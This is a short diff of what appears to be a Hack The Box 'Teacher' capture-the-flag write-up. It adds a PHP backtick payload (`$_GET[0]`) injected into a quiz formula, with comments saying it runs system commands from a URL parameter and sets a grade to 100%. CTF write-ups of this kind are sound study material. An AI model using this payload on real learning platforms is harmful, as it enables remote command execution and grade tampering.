@@ -203,6 +203,8 @@
 
 // Add the formula and change grade to 100% (coz we good students[;)
 
+    /*{a*/`$_GET[0]`;//{x}}
+
 // This will allow us to pass system commands through a url parameter called 0 
 
 ![Image 9.10](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.10.png)
